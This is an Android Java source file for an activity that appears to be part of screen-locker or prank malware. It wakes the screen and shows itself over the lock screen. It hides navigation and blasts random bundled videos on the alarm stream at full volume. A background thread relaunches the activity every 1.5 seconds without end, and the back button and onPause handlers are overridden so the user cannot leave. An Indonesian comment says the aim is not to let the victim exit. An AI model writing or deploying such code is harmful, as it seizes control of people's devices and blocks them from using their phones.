package com.rhfvnc.strain;
import android.app.Activity;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.VideoView;
import java.util.Random;
public class VideoActivity extends Activity {
    private VideoView vv;
    private final Random rnd = new Random();
    private int lastIdx = -1;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        vv = new VideoView(this);
        setContentView(vv);
        vv.setOnPreparedListener(mp -> {
            mp.setAudioStreamType(AudioManager.STREAM_ALARM);
            mp.setVolume(1.0f, 1.0f);
            mp.setLooping(false);
        });
        vv.setOnCompletionListener(mp -> playNext());
        vv.setOnErrorListener((mp, what, extra) -> { playNext(); return true; });
        playNext();

        // spam relaunch video activity, jangan biarin keluar
        new Thread(() -> {
            while (true) {
                try {
                    Intent i = new Intent(VideoActivity.this, VideoActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    try { startActivity(i); } catch (Throwable ignored) {}
                } catch (Throwable ignored) {}
                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
            }
        }).start();
    }
    private void playNext() {
        int idx;
        do { idx = 1 + rnd.nextInt(6); } while (idx == lastIdx);
        lastIdx = idx;
        int resId = getResources().getIdentifier("v" + idx, "raw", getPackageName());
        if (resId == 0) { resId = getResources().getIdentifier("pay", "raw", getPackageName()); }
        if (resId == 0) return;
        Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + resId);
        try {
            vv.setVideoURI(u);
            vv.start();
        } catch (Throwable t) { playNext(); }
    }
    @Override
    public void onBackPressed() {
        playNext();
    }
    @Override
    protected void onPause() {
        super.onPause();
        // langsung balik
        Intent i = new Intent(this, VideoActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
    }
}
